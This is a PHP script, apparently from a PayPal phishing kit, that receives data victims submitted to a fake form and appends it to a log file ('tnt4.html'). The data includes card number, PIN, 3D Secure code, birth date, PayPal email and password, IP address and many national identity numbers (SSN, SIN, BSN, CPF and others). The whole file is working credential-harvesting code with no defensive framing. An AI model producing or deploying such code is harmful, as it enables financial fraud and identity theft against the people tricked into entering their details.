<?
if (! ($_SERVER['REQUEST_METHOD'] === 'POST')) {
     exit;
}
  $_SESSION = $_POST['s'];
unset($_POST['s']);


$Alali = "<pre style='border: 2px solid; border-color: rgb(67, 159, 253);border-radius: 4px;font-weight: bold;font-size: 14px;padding-top: 1.5%;padding-bottom: 2%;'>
  <img src='https://2.bp.blogspot.com/-O-ZJASC706s/U_hvz20oD2I/AAAAAAAAACw/OV1BlsEyjM0/s1600/logo_106x27.png'/>

  <font style='color: rgb(251, 58, 105);'>PP BILLING & CARD:</font>
  <font style='color: rgb(20, 158, 27);'>Add Date CARD:</font> $date       
                                                                                                                                                                                                                                    
   <font style='color: rgb(128, 129, 131);'>&#10112;  :</font>  <font style='color: rgb(235, 79, 60);'> ".$_POST['cc1type']." ".$_POST['cardnumberInput']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; Birth Date :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['birthdateInput']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10113; 3D Secure :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['secure_CC1Input']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; Card PIN  :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['pin1']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10113; SocialSecurityNum         :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['SSN']."</font>
    <font style='color: rgb(128, 129, 131);'>&#10112; SocialInsuranceNum :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['SIN']."</font>
     <font style='color: rgb(128, 129, 131);'>&#10112; NationalInsuranceNum :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['NIN']."</font>
      <font style='color: rgb(128, 129, 131);'>&#10112; FiscalCodiceNum :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['FCN']."</font>
       <font style='color: rgb(128, 129, 131);'>&#10112; PersonalPublicService :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['IRPPS']."</font>
        <font style='color: rgb(128, 129, 131);'>&#10112; AdastroPessoasFísicas :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['CPFBR']."</font>
         <font style='color: rgb(128, 129, 131);'>&#10112; BurgerServiceNummer :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['BSN']."</font>
          <font style='color: rgb(128, 129, 131);'>&#10112; NationalIdentityDoc :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['DNI']."</font>
           <font style='color: rgb(128, 129, 131);'>&#10112; PersonNummer :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['SID']."</font>

<font style='color:#9c0000;'>℗</font> [PP Email] = <font style='color:#0070ba;'>".$_SESSION['_login_email_']."</font><br>
<font style='color:#9c0000;'>℗</font> [PP Password] = <font style='color:#0070ba;'>".$_SESSION['_login_password_']."</font><br>
   <font style='color: rgb(128, 129, 131);'>&#10114; IP          :</font>  <font style='color: rgb(60, 118, 235);'><a target='_blank' style='text-decoration:none;' href='http://www.geoiptool.com/?IP=".$_POST['REMOTE_ADDR']."'>".$_POST['REMOTE_ADDR']."</a></font><br> 
   <font style='color:#9c0000;'>✪</font> [BROWSER] = <font style='color:#0070ba;'>".$_POST['b']." On ".$_POST['os']."</font><br>
   
   ";
   
   
  
  $f = fopen("tnt4.html", "a");
      fwrite($f, $Alali);
    
    fclose($f);
    
   
   



?>